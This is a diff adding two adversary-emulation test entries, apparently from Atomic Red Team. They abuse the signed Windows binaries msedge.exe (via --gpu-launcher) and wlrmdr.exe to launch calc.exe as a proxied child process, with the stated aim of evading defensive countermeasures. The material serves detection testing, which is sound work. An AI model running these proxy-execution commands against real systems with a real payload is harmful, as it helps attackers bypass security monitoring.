@@ -374,3 +374,45 @@ atomic_tests:
       reg add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe
       c:\windows\system32\provlaunch.exe LOLBin
     name: command_prompt
+- name: LOLBAS Msedge to Spawn Process
+  auto_generated_guid: e5eedaed-ad42-4c1e-8783-19529738a349
+  description: |
+    Executes a process under a trusted Microsoft signed binary,mseddge. This test will spawn "calc.exe" as a child process of msedge.exe
+    - https://lolbas-project.github.io/lolbas/Binaries/Msedge/
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      $edgePath64 = "C:\Program Files\Microsoft\Edge\Application\msedge.exe"
+      if (Test-Path $edgePath64) {
+          $edgePath = $edgePath64
+      } else {
+          # Check 32-bit Edge installation path
+          $edgePath32 = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
+          if (Test-Path $edgePath32) {
+              $edgePath = $edgePath32
+          } else {
+              exit 1
+          }
+      }
+      & $edgePath --disable-gpu-sandbox --gpu-launcher="C:\\Windows\\System32\\calc.exe &&"
+      sleep 5
+      taskkill -f -im msedge.exe
+      taskkill -f -im calc.exe
+      taskkill -f -im win32calc.exe
+    name: powershell
+- name: System Binary Proxy Execution - Wlrmdr Lolbin
+  auto_generated_guid: 7816c252-b728-4ea6-a683-bd9441ca0b71
+  description: Use wlrmdr(Windows Logon Reminder executable) as a proxy binary to evade defensive countermeasures
+  supported_platforms:
+  - windows
+  input_arguments:
+    payload_path:
+      description: Path to the executable
+      type: String
+      default: C:\Windows\System32\calc.exe
+  executor:
+    command: wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u "#{payload_path}"
+    name: powershell
+    elevation_required: false
+  
